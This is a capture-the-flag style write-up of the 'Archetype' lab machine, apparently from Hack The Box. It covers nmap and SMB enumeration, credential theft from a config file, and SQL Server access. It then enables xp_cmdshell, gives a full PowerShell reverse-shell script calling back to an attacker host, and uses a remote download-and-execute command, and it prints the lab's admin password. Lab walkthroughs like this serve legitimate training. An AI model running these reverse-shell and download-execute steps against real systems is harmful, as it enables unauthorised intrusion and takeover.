---
title: "Writeup: Archetype"
date: 2020-12-29T9:34:30-04:00
categories:
  - Blog
  - Notes
tags:
  - archetype
  - update
  - nmap
  - impacket
  - smbclient
  - webshell
  - PE
  - password
---

Here are notes from the named target:

1. Enumeration - Ports 445 and 1433 are open, which are associated with file sharing (SMB) and SQL Server.
```yaml
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.27 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 nmap -sC -sV -p$ports 10.10.10.27 
```

2.Enumeration - It is worth checking to see if anonymous access has been permitted, as file shares often store configuration files containing passwords or other sensitive information. We can use smbclient to list available shares
```yaml
smbclient -N -L \\\\10.10.10.27\\ 
```

3. Enumeration - There is a share called backups on the server that is public
```yaml
smbclient -N \\\\10.10.10.27\backups
```
Use Dir and Get to list and then download that file - prod.dtsConfig 

4. There is a dtsConfig file, which is a config file used with SSIS.

use CAT to read it locally

You will see the password for the SWL server

5. Foothold - Use mssqlclient to connect to the SQL server on the box
```yaml
mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
```
provide the password from the config fill viewed in step 4

We can use the IS_SRVROLEMEMBER function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. This is successful, and we do indeed have sysadmin privileges.

This will allow us to enable xp_cmdshell and gain RCE on the host. Let's attempt this, by inputting the commands below.

6. Foothold - we have highest level access in the SQL server so we rune xp_cmdshell to do RCE

```yaml
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```

The whoami command output reveals that the SQL Server is also running in the context of the user ARCHETYPE\sql_svc. However, this account doesn't seem to have administrative privileges on the host.

7. Reverse Shell - Let's attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as shell.ps1.
```yaml
$client = New-Object System.Net.Sockets.TCPClient("Attacker IP",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
Next, stand up a mini webserver in order to host the file. We can use Python.

```yaml
python3 -m http.server 80
```

After standing up a netcat listener on port 443, we can use ufw to allow the call backs on port 80 and 443 to our machine. No need to open firewall if we dont have it lovally

```yaml
nc -lvnp 443
```

We can now issue the command to download and execute the reverse shell through xp_cmdshell.

```yaml
xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://Attacker IP/shell.ps1\");"
```

A shell is received as sql_svc, and we can get the user.txt on their desktop by navigating the remote system as sql account

8. Privilege Esclation - As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to access the PowerShell history file.

```yaml
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt  (can also use more command to see contents of file like the user dile

```

That history file shows that the administrator account was used to map a drive to T:\ and what the password was.

From the "ARCHTYPE" box we learned that their was an Administrator/Admin account that used the Password: MEGACORP_4dm1n!!

This reveals that the backups drive has been mapped using the local administrator credentials. We can use Impacket's psexec.py to gain a privileged shell.

Finally we can use psexec.py from Impacket to connect to the server as Administrator useing the password found in the above step and het the root target hash

 Administrator/Admin account that used the Password: MEGACORP_4dm1n!!



